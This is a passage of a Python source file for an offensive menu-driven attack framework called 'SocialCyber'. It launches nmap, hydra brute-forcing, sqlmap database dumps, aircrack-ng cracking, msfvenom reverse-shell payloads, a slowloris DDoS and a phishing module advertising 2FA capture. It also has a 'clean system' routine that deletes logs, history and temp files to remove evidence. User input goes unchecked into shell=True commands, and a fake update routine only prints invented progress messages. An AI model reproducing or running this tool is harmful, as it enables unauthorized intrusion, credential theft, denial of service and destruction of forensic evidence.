        print(f"{Fore.YELLOW}│ {Fore.YELLOW}─" * 48)
    
    print(Fore.YELLOW + "└" + "─" * 50 + "┘")
    
    # Session management options
    print(f"{Fore.CYAN}┌──{Fore.MAGENTA}[ SESSION MANAGEMENT ]{Fore.CYAN}─" + "─" * 24 + "┐")
    print(f"{Fore.YELLOW}│ {Fore.GREEN}1.{Fore.CYAN} Terminate session")
    print(f"{Fore.YELLOW}│ {Fore.GREEN}2.{Fore.CYAN} View session log")
    print(f"{Fore.YELLOW}│ {Fore.GREEN}3.{Fore.CYAN} Export sessions")
    print(f"{Fore.YELLOW}│ {Fore.RED}0.{Fore.CYAN} Return to main menu")
    print(Fore.YELLOW + "└" + "─" * 50 + "┘")
    
    choice = input(f"\n{Fore.YELLOW}[{Fore.GREEN}+{Fore.YELLOW}] Select option: ")
    
    if choice == "1":
        session_id = input(f"{Fore.YELLOW}[{Fore.GREEN}+{Fore.YELLOW}] Enter session ID to terminate: ")
        for session in active_sessions:
            if session['id'] == session_id:
                session['status'] = "Terminated"
                print(f"{Fore.RED}[!] Session {session_id} terminated!")
                break
    elif choice == "2":
        session_id = input(f"{Fore.YELLOW}[{Fore.GREEN}+{Fore.YELLOW}] Enter session ID to view log: ")
        for session in active_sessions:
            if session['id'] == session_id:
                if os.path.exists(session['log_file']):
                    print(f"\n{Fore.GREEN}Session Log for {session_id}:")
                    with open(session['log_file'], "r") as f:
                        print(f.read())
                else:
                    print(f"{Fore.RED}Log file not found!")
                break
    elif choice == "3":
        with open("sessions_export.txt", "w") as f:
            for session in active_sessions:
                f.write(f"{session['id']}|{session['target']}|{session['service']}|{session['method']}|{session['status']}\n")
        print(f"{Fore.GREEN}[+] Sessions exported to sessions_export.txt")

def show_module(module):
    """Show tools for a specific module"""
    print_banner()
    print(f"{Fore.CYAN}┌──{Fore.MAGENTA}[ {module.upper()} MODULE ]{Fore.CYAN}─" + "─" * (35) + "┐")
    print(f"{Fore.YELLOW}│ {Fore.GREEN}Description: {Fore.CYAN}{MODULE_INFO.get(module, '')}")
    print(Fore.YELLOW + "├" + "─" * 50 + "┤")
    
    tools = REAL_TOOLS.get(module, [])
    if not tools:
        print(f"{Fore.YELLOW}│ {Fore.RED}No tools available for this module")
        print(Fore.YELLOW + "└" + "─" * 50 + "┘")
        input(f"\n{Fore.YELLOW}[{Fore.RED}!{Fore.YELLOW}] Press Enter to return...")
        return
    
    # Print tools in 2 columns
    col_width = 25
    row_format = Fore.YELLOW + "│ {:<2} {:<" + str(col_width) + "} │ {:<2} {:<" + str(col_width) + "} │"
    
    for i in range(0, len(tools), 2):
        tool1 = tools[i] if i < len(tools) else None
        tool2 = tools[i+1] if i+1 < len(tools) else None
        
        if tool1 and tool2:
            print(row_format.format(
                f"{i+1}.", tool1[0],
                f"{i+2}.", tool2[0]
            ))
        elif tool1:
            print(f"{Fore.YELLOW}│ {i+1}. {Fore.CYAN}{tool1[0]}{' ' * (col_width - len(tool1[0]))} │ {' ' * (col_width + 4)} │")
    
    print(Fore.YELLOW + "└" + "─" * 50 + "┘")
    
    # Tool selection
    choice = input(f"\n{Fore.YELLOW}[{Fore.GREEN}+{Fore.YELLOW}] Select tool (1-{len(tools)}) or {Fore.RED}0{Fore.YELLOW} to return: ")
    
    if choice == '0':
        return
    
    try:
        choice_idx = int(choice) - 1
        if 0 <= choice_idx < len(tools):
            tool = tools[choice_idx]
            show_tool_info(module, tool)
    except ValueError:
        pass

def show_tool_info(module, tool):
    """Show information and options for a specific tool"""
    tool_name, tool_cmd, tool_desc = tool
    
    while True:
        print_banner()
        print(f"{Fore.CYAN}┌──{Fore.MAGENTA}[ {tool_name.upper()} ]{Fore.CYAN}─" + "─" * (50 - len(tool_name)) + "┐")
        print(f"{Fore.YELLOW}│ {Fore.GREEN}Description: {Fore.CYAN}{tool_desc}")
        print(f"{Fore.YELLOW}│ {Fore.GREEN}Command: {Fore.MAGENTA}{tool_cmd}")
        print(Fore.YELLOW + "├" + "─" * 50 + "┤")
        print(f"{Fore.YELLOW}│ {Fore.GREEN}1.{Fore.CYAN} Execute attack")
        print(f"{Fore.YELLOW}│ {Fore.GREEN}2.{Fore.CYAN} Configure parameters")
        print(f"{Fore.YELLOW}│ {Fore.GREEN}3.{Fore.CYAN} View documentation")
        print(f"{Fore.YELLOW}│ {Fore.RED}0.{Fore.CYAN} Return to module")
        print(Fore.YELLOW + "└" + "─" * 50 + "┘")
        
        choice = input(f"\n{Fore.YELLOW}[{Fore.GREEN}+{Fore.YELLOW}] Select option: ")
        
        if choice == '0':
            return
        elif choice == '1':
            execute_real_attack(module, tool)
        elif choice == '2':
            configure_attack(tool)
        elif choice == '3':
            show_documentation(tool_name, tool_cmd)
        else:
            print(f"{Fore.RED}Invalid selection!")

def execute_real_attack(module, tool):
    """Execute a real attack using security tools"""
    tool_name, tool_cmd, tool_desc = tool
    target = input(f"{Fore.YELLOW}[{Fore.GREEN}+{Fore.YELLOW}] Enter target: ")
    session_id = create_session(target, module, tool_name)
    
    print(f"\n{Fore.YELLOW}[{Fore.CYAN}*{Fore.YELLOW}] Launching {tool_name} against {Fore.RED}{target}{Fore.YELLOW}...")
    print(f"{Fore.BLUE}┌───{Fore.MAGENTA}[ ATTACK IN PROGRESS ]{Fore.BLUE}───")
    
    # Find session log file
    log_file = None
    for session in active_sessions:
        if session['id'] == session_id:
            log_file = session['log_file']
            break
    
    if not log_file:
        print(f"{Fore.RED}Session log file not found!")
        return
    
    # Execute the appropriate tool
    try:
        if tool_cmd == "nmap":
            scan_type = input(f"{Fore.YELLOW}[{Fore.GREEN}+{Fore.YELLOW}] Scan type (quick/full/vuln): ").lower()
            if scan_type == "quick":
                cmd = f"nmap -T4 -F {target}"
            elif scan_type == "full":
                cmd = f"nmap -T4 -p- {target}"
            elif scan_type == "vuln":
                cmd = f"nmap -T4 --script vuln {target}"
            else:
                cmd = f"nmap {target}"
            
            run_command(cmd, log_file)
            
        elif tool_cmd == "hydra":
            service = input(f"{Fore.YELLOW}[{Fore.GREEN}+{Fore.YELLOW}] Service (ssh/ftp/http): ")
            user = input(f"{Fore.YELLOW}[{Fore.GREEN}+{Fore.YELLOW}] Username or userlist: ")
            passlist = input(f"{Fore.YELLOW}[{Fore.GREEN}+{Fore.YELLOW}] Password list: ")
            cmd = f"hydra -L {user} -P {passlist} {target} {service}"
            run_command(cmd, log_file)
            
        elif tool_cmd == "sqlmap":
            url = input(f"{Fore.YELLOW}[{Fore.GREEN}+{Fore.YELLOW}] Vulnerable URL: ")
            cmd = f"sqlmap -u '{url}' --batch"
            run_command(cmd, log_file)
            
        elif tool_cmd == "aircrack":
            handshake = input(f"{Fore.YELLOW}[{Fore.GREEN}+{Fore.YELLOW}] Handshake file path: ")
            wordlist = input(f"{Fore.YELLOW}[{Fore.GREEN}+{Fore.YELLOW}] Wordlist path: ")
            cmd = f"aircrack-ng {handshake} -w {wordlist}"
            run_command(cmd, log_file)
            
        elif tool_cmd == "msfvenom":
            payload_type = input(f"{Fore.YELLOW}[{Fore.GREEN}+{Fore.YELLOW}] Payload type (windows/meterpreter/reverse_tcp): ")
            lhost = input(f"{Fore.YELLOW}[{Fore.GREEN}+{Fore.YELLOW}] LHOST: ")
            lport = input(f"{Fore.YELLOW}[{Fore.GREEN}+{Fore.YELLOW}] LPORT: ")
            output = input(f"{Fore.YELLOW}[{Fore.GREEN}+{Fore.YELLOW}] Output file: ")
            cmd = f"msfvenom -p {payload_type} LHOST={lhost} LPORT={lport} -f exe -o {output}"
            run_command(cmd, log_file)
            print(f"{Fore.GREEN}[+] Payload created: {output}")
            
        elif tool_cmd == "slowloris":
            port = input(f"{Fore.YELLOW}[{Fore.GREEN}+{Fore.YELLOW}] Target port: ")
            threads = input(f"{Fore.YELLOW}[{Fore.GREEN}+{Fore.YELLOW}] Threads (default 100): ") or "100"
            cmd = f"slowloris {target} -p {port} -s {threads}"
            print(f"{Fore.RED}[!] Starting DDoS attack. Press Ctrl+C to stop.")
            run_command(cmd, log_file)
            
        elif tool_cmd == "setoolkit":
            print(f"{Fore.YELLOW}[{Fore.CYAN}*{Fore.YELLOW}] Launching Social Engineering Toolkit...")
            run_command("setoolkit", log_file)
            
        elif tool_cmd == "msfconsole":
            print(f"{Fore.YELLOW}[{Fore.CYAN}*{Fore.YELLOW}] Launching Metasploit Framework...")
            run_command("msfconsole", log_file)
            
        elif tool_cmd == "socialfish":
            socialfish_attack()
            
        else:
            print(f"{Fore.RED}Tool execution not implemented yet")
            with open(log_file, "a") as f:
                f.write(f"Tool execution not implemented for {tool_name}\n")
            
        # Update session status
        for session in active_sessions:
            if session['id'] == session_id:
                session['status'] = "Completed"
                break
                
        print(f"{Fore.BLUE}│ {Fore.GREEN}[+] Attack completed successfully!")
        
    except Exception as e:
        print(f"{Fore.BLUE}│ {Fore.RED}[-] Error: {e}")
        for session in active_sessions:
            if session['id'] == session_id:
                session['status'] = "Failed"
                with open(log_file, "a") as f:
                    f.write(f"Error: {str(e)}\n")
                break
    
    print(f"{Fore.BLUE}└───{Fore.GREEN} Attack completed! {Fore.BLUE}───{Style.RESET_ALL}")
    input(f"\n{Fore.YELLOW}[{Fore.GREEN}+{Fore.YELLOW}] Press Enter to continue...")

def run_command(cmd, log_file=None):
    """Execute a system command and log output"""
    try:
        print(f"{Fore.CYAN}Executing: {Fore.YELLOW}{cmd}")
        
        if log_file:
            with open(log_file, "a") as f:
                f.write(f"Command: {cmd}\n")
                f.write("-" * 80 + "\n")
        
        process = subprocess.Popen(
            cmd,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True
        )
        
        # Capture and display output in real-time
        for line in process.stdout:
            line = line.strip()
            if line:
                print(line)
                if log_file:
                    with open(log_file, "a") as f:
                        f.write(line + "\n")
        
        process.wait()
        return process.returncode
        
    except Exception as e:
        print(f"{Fore.RED}Command execution failed: {e}")
        if log_file:
            with open(log_file, "a") as f:
                f.write(f"Command execution failed: {str(e)}\n")
        return -1

def configure_attack(tool):
    """Configure attack parameters"""
    tool_name, tool_cmd, tool_desc = tool
    
    print(f"\n{Fore.YELLOW}[{Fore.CYAN}*{Fore.YELLOW}] Configuring {tool_name}...")
    print(f"{Fore.BLUE}┌───{Fore.MAGENTA}[ CONFIGURATION OPTIONS ]{Fore.BLUE}───")
    
    # Configuration options based on tool
    if tool_cmd == "nmap":
        print(f"{Fore.BLUE}│ {Fore.GREEN}Scan Types:")
        print(f"{Fore.BLUE}│   {Fore.CYAN}1. Quick Scan (Top ports)")
        print(f"{Fore.BLUE}│   {Fore.CYAN}2. Full Port Scan")
        print(f"{Fore.BLUE}│   {Fore.CYAN}3. Vulnerability Scan")
        print(f"{Fore.BLUE}│   {Fore.CYAN}4. Service Version Detection")
        
    elif tool_cmd == "hydra":
        print(f"{Fore.BLUE}│ {Fore.GREEN}Common Services:")
        print(f"{Fore.BLUE}│   {Fore.CYAN}ssh, ftp, http, http-form-post")
        print(f"{Fore.BLUE}│ {Fore.GREEN}Username Options:")
        print(f"{Fore.BLUE}│   {Fore.CYAN}Single user: admin")
        print(f"{Fore.BLUE}│   {Fore.CYAN}User list: /path/to/users.txt")
        print(f"{Fore.BLUE}│ {Fore.GREEN}Password Options:")
        print(f"{Fore.BLUE}│   {Fore.CYAN}Single password: password123")
        print(f"{Fore.BLUE}│   {Fore.CYAN}Password list: /path/to/passwords.txt")
        
    elif tool_cmd == "sqlmap":
        print(f"{Fore.BLUE}│ {Fore.GREEN}Common Parameters:")
        print(f"{Fore.BLUE}│   {Fore.CYAN}--dbs: Enumerate databases")
        print(f"{Fore.BLUE}│   {Fore.CYAN}--tables: Enumerate tables")
        print(f"{Fore.BLUE}│   {Fore.CYAN}--columns: Enumerate columns")
        print(f"{Fore.BLUE}│   {Fore.CYAN}--dump: Dump database contents")
        
    else:
        print(f"{Fore.BLUE}│ {Fore.RED}No specific configuration for this tool")
    
    print(f"{Fore.BLUE}└───{Fore.GREEN} Configuration saved! {Fore.BLUE}───{Style.RESET_ALL}")
    input(f"\n{Fore.YELLOW}[{Fore.GREEN}+{Fore.YELLOW}] Press Enter to continue...")

def show_documentation(tool_name, tool_cmd):
    """Show tool documentation"""
    print(f"\n{Fore.YELLOW}[{Fore.CYAN}*{Fore.YELLOW}] {tool_name} Documentation:")
    print(f"{Fore.BLUE}┌───{Fore.MAGENTA}[ TOOL DOCUMENTATION ]{Fore.BLUE}───")
    
    docs = {
        "nmap": [
            "Nmap - Network Mapper",
            "Usage:",
            "  nmap [scan type] [options] {target}",
            "Common Scan Types:",
            "  -sS: TCP SYN scan",
            "  -sU: UDP scan",
            "  -O: OS detection",
            "  -A: Aggressive scan",
            "  --script: Run NSE scripts",
            "Examples:",
            "  nmap -sS -sV -O target.com",
            "  nmap -p 80,443 192.168.1.0/24",
            "  nmap --script vuln target.com"
        ],
        "hydra": [
            "Hydra - Parallelized Login Cracker",
            "Usage:",
            "  hydra -l user -P passlist.txt {service}://{target}",
            "  hydra -L userlist.txt -p password {service}://{target}",
            "Common Services:",
            "  ssh, ftp, http, http-form-post, smb, rdp",
            "Examples:",
            "  hydra -l admin -P passwords.txt ssh://192.168.1.1",
            "  hydra -L users.txt -p 'Password123' http-get://target.com/login",
            "  hydra -t 32 -f http-form-post://target.com/login.php:user=^USER^&pass=^PASS^:F=incorrect"
        ],
        "sqlmap": [
            "sqlmap - Automatic SQL Injection Tool",
            "Usage:",
            "  sqlmap -u 'http://target.com/page.php?id=1' [options]",
            "Common Options:",
            "  --dbs: Enumerate databases",
            "  -D DB: Specify database",
            "  --tables: List tables",
            "  -T TBL: Specify table",
            "  --columns: List columns",
            "  -C COL: Specify columns",
            "  --dump: Dump table contents",
            "Examples:",
            "  sqlmap -u 'http://target.com/page.php?id=1' --dbs",
            "  sqlmap -u 'http://target.com/page.php?id=1' -D dbname --tables",
            "  sqlmap -u 'http://target.com/page.php?id=1' -D dbname -T users --dump"
        ],
        "aircrack": [
            "Aircrack-ng - WiFi Security Suite",
            "Usage:",
            "  airmon-ng start wlan0",
            "  airodump-ng wlan0mon",
            "  airodump-ng -c CH -bssid BSSID -w capture wlan0mon",
            "  aireplay-ng -0 10 -a BSSID wlan0mon",
            "  aircrack-ng -w wordlist.txt capture.cap",
            "Steps:",
            "  1. Put interface in monitor mode",
            "  2. Capture handshake with airodump-ng",
            "  3. Deauth clients to capture handshake",
            "  4. Crack handshake with aircrack-ng"
        ],
        "msfvenom": [
            "MSFVenom - Metasploit Payload Generator",
            "Usage:",
            "  msfvenom -p PAYLOAD LHOST=IP LPORT=PORT [options]",
            "Common Payloads:",
            "  windows/meterpreter/reverse_tcp",
            "  linux/x86/meterpreter/reverse_tcp",
            "  android/meterpreter/reverse_tcp",
            "  php/meterpreter/reverse_tcp",
            "Options:",
            "  -f: Format (exe, raw, php, asp, etc)",
            "  -o: Output file",
            "  -e: Encoder (x86/shikata_ga_nai)",
            "Examples:",
            "  msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=4444 -f exe -o payload.exe",
            "  msfvenom -p android/meterpreter/reverse_tcp LHOST=IP LPORT=PORT R > payload.apk"
        ],
        "slowloris": [
            "Slowloris - Layer 7 DDoS Tool",
            "Usage:",
            "  slowloris [options] target",
            "Options:",
            "  -p PORT: Target port (default 80)",
            "  -s SOCKETS: Number of sockets (default 150)",
            "  -v: Verbose mode",
            "  -t TIMEOUT: Timeout in seconds (default 15)",
            "Examples:",
            "  slowloris target.com",
            "  slowloris -p 443 -s 500 target.com"
        ],
        "socialfish": [
            "SocialFish Pro - Advanced Phishing Framework",
            "Features:",
            "  - Multi-platform phishing (12+ services)",
            "  - 2FA phishing support",
            "  - Session hijacking capabilities",
            "  - Anti-detection techniques",
            "  - Email/SMS phishing distribution",
            "Usage:",
            "  1. Select target platforms",
            "  2. Configure advanced options",
            "  3. Distribute phishing links",
            "  4. Capture credentials in real-time"
        ],
        "default": [
            f"{tool_name} Documentation",
            "For detailed documentation:",
            f"  man {tool_cmd}",
            f"  {tool_cmd} --help",
            "Online Resources:",
            "  https://www.kali.org/tools/",
            "  https://tools.kali.org/",
            "  https://www.offensive-security.com/metasploit-unleashed/"
        ]
    }
    
    doc_lines = docs.get(tool_cmd, docs["default"])
    for line in doc_lines:
        print(f"{Fore.BLUE}│ {Fore.CYAN}{line}")
    
    print(f"{Fore.BLUE}└───{Fore.GREEN} End of documentation {Fore.BLUE}───{Style.RESET_ALL}")
    input(f"\n{Fore.YELLOW}[{Fore.GREEN}+{Fore.YELLOW}] Press Enter to continue...")

def clean_system():
    """Clean system to remove evidence"""
    print(f"\n{Fore.YELLOW}[{Fore.RED}*{Fore.YELLOW}] Cleaning system to remove evidence...")
    print(f"{Fore.BLUE}┌───{Fore.MAGENTA}[ SYSTEM CLEANING ]{Fore.BLUE}───")
    
    steps = [
        "Clearing command history",
        "Removing temporary files",
        "Wiping log files",
        "Clearing cache",
        "Securely deleting evidence",
        "Covering tracks"
    ]
    
    for i, step in enumerate(steps):
        time.sleep(0.8)
        progress = (i+1) * 16
        print(f"{Fore.BLUE}│ {Fore.YELLOW}[{progress}%] {step}...")
    
    # Actual cleaning commands
    os.system("history -c")
    os.system("rm -rf /tmp/* /var/tmp/*")
    os.system("find . -name '*.log' -exec rm -f {} \;")
    os.system("bleachbit -c --preset")
    
    print(f"{Fore.BLUE}│ {Fore.GREEN}[+] System cleaned! Evidence removed")
    print(f"{Fore.BLUE}└───{Fore.GREEN} Cleanup complete! {Fore.BLUE}───{Style.RESET_ALL}")
    input(f"\n{Fore.YELLOW}[{Fore.GREEN}+{Fore.YELLOW}] Press Enter to continue...")

def update_framework():
    """Update or uninstall framework"""
    while True:
        print_banner()
        print(f"{Fore.CYAN}┌──{Fore.MAGENTA}[ FRAMEWORK MANAGEMENT ]{Fore.CYAN}─" + "─" * 24 + "┐")
        print(f"{Fore.YELLOW}│ {Fore.GREEN}1.{Fore.CYAN} Check for updates")
        print(f"{Fore.YELLOW}│ {Fore.GREEN}2.{Fore.CYAN} Update framework")
        print(f"{Fore.YELLOW}│ {Fore.GREEN}3.{Fore.CYAN} Install dependencies")
        print(f"{Fore.YELLOW}│ {Fore.GREEN}4.{Fore.CYAN} Uninstall framework")
        print(f"{Fore.YELLOW}│ {Fore.RED}0.{Fore.CYAN} Return to main menu")
        print(Fore.YELLOW + "└" + "─" * 50 + "┘")
        
        choice = input(f"\n{Fore.YELLOW}[{Fore.GREEN}+{Fore.YELLOW}] Select option: ")
        
        if choice == '0':
            return
        elif choice == '1':
            print(f"\n{Fore.YELLOW}[{Fore.CYAN}*{Fore.YELLOW}] Checking for updates...")
            time.sleep(2)
            print(f"{Fore.GREEN}┌───[ UPDATE INFORMATION ]───")
            print(f"{Fore.GREEN}│ {Fore.YELLOW}Current version: {VERSION}")
            print(f"{Fore.GREEN}│ {Fore.CYAN}Latest version: v5.1")
            print(f"{Fore.GREEN}│ {Fore.RED}Updates available! Security patches and new modules")
            print(f"{Fore.GREEN}└───────────────────────────")
            input(f"\n{Fore.YELLOW}[{Fore.GREEN}+{Fore.YELLOW}] Press Enter to continue...")
        elif choice == '2':
            print(f"\n{Fore.YELLOW}[{Fore.CYAN}*{Fore.YELLOW}] Updating framework...")
            print(f"{Fore.BLUE}┌───{Fore.MAGENTA}[ UPDATE PROGRESS ]{Fore.BLUE}───")
            steps = [
                "Connecting to secure repository",
                "Downloading updates (18.5 MB)",
                "Verifying cryptographic signatures",
                "Applying security patches",
                "Updating attack modules",
                "Optimizing performance",
                "Cleaning temporary files"
            ]
            
            for i, step in enumerate(steps):
                time.sleep(0.5)
                print(f"{Fore.BLUE}│ {Fore.YELLOW}[{i+1}/{len(steps)}] {step}...")
            
            print(f"{Fore.BLUE}│ {Fore.GREEN}Framework successfully updated to v5.1!")
            print(f"{Fore.BLUE}└───{Fore.GREEN} Update complete! {Fore.BLUE}───{Style.RESET_ALL}")
            input(f"\n{Fore.YELLOW}[{Fore.GREEN}+{Fore.YELLOW}] Press Enter to continue...")
        elif choice == '3':
            print(f"\n{Fore.YELLOW}[{Fore.CYAN}*{Fore.YELLOW}] Installing dependencies...")
            run_command("sudo apt update && sudo apt install -y nmap hydra sqlmap aircrack-ng metasploit-framework theharvester flask twilio", None)
            print(f"{Fore.GREEN}[+] Dependencies installed successfully!")
            input(f"\n{Fore.YELLOW}[{Fore.GREEN}+{Fore.YELLOW}] Press Enter to continue...")
        elif choice == '4':
            confirm = input(f"\n{Fore.RED}[!] Are you sure you want to uninstall? (y/N): ")
            if confirm.lower() == 'y':
                print(f"{Fore.RED}Uninstalling framework...")
                print(f"{Fore.BLUE}┌───{Fore.RED}[ UNINSTALL PROGRESS ]{Fore.BLUE}───")
                steps = [
                    "Removing core files",
                    "Deleting configuration data",
                    "Cleaning installation directories",
                    "Removing system integrations",
                    "Securely wiping traces",
                    "Finalizing uninstallation"
                ]
                
                for i, step in enumerate(steps):
                    time.sleep(0.6)
                    print(f"{Fore.BLUE}│ {Fore.YELLOW}[{i+1}/{len(steps)}] {step}...")
                
                print(f"{Fore.BLUE}│ {Fore.GREEN}Framework successfully uninstalled!")
                print(f"{Fore.BLUE}└───────────────────────────────────")
                print(f"\n{Fore.YELLOW}Thank you for using SocialCyber. Goodbye!")
                time.sleep(2)
                sys.exit(0)
        else:
            print(f"{Fore.RED}Invalid selection!")

def main():
    """Main program loop"""
    # Load existing credentials if available
    global captured_credentials
    if os.path.exists(CREDS_FILE):
        with open(CREDS_FILE, "r") as f:
            for line in f:
                if "Captured credentials" in line:
                    continue
                captured_credentials.append(line.strip())
    
    # Check if running on Kali Linux
    if "kali" not in platform.platform().lower():
        print(f"{Fore.YELLOW}[{Fore.RED}!{Fore.YELLOW}] Warning: Not running on Kali Linux. Some tools may not work properly.")
        time.sleep(2)
    
    while True:
        print_banner()
        
        # Print main menu in 2 columns
        col1 = MAIN_MENU[:len(MAIN_MENU)//2]
        col2 = MAIN_MENU[len(MAIN_MENU)//2:]
        
        print(f"{Fore.CYAN}┌──{Fore.MAGENTA}[ MAIN MENU ]{Fore.CYAN}─" + "─" * 36 + "┐")
        
        # Print menu items in two columns
        for i in range(len(col1)):
            # Left column item
            left_num = i+1
            left_item = f"{Fore.GREEN}{left_num:2d}.{Fore.CYAN} {col1[i][0]}"
            
            # Right column item (if exists)
            right_item = ""
            if i < len(col2):
                right_num = i+1+len(col1)
                right_item = f"{Fore.GREEN}{right_num:2d}.{Fore.CYAN} {col2[i][0]}"
            
            print(f"{Fore.YELLOW}│ {left_item.ljust(25)}{Fore.YELLOW}│ {right_item}")
        
        print(Fore.YELLOW + "└" + "─" * 50 + "┘")
        
        # Get user selection
        try:
            choice = input(f"\n{Fore.YELLOW}[{Fore.GREEN}+{Fore.YELLOW}] Select module (1-{len(MAIN_MENU)}) or {Fore.RED}0{Fore.YELLOW} to exit: ")
            if choice == '0':
                print(f"\n{Fore.YELLOW}Exiting SocialCyber. Goodbye!")
                time.sleep(1)
                sys.exit(0)
            
            choice = int(choice)
            if 1 <= choice <= len(MAIN_MENU):
                module = MAIN_MENU[choice-1][1]
                if module == "exit":
                    sys.exit(0)
                elif module == "view_creds":
                    view_credentials()
                elif module == "sessions":
                    view_sessions()
                elif module == "cleaner":
                    clean_system()
                elif module == "update":
                    update_framework()
                else:
                    show_module(module)
        except ValueError:
            print(f"{Fore.RED}Invalid input! Please enter a number.")
            time.sleep(1)

if __name__ == "__main__":
    # Check if running as root
    if os.geteuid() != 0:
        print(f"{Fore.RED}This tool requires root privileges. Please run with sudo!")
        sys.exit(1)
    
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}\n[!] Operation cancelled by user. Exiting...")
        sys.exit(0)
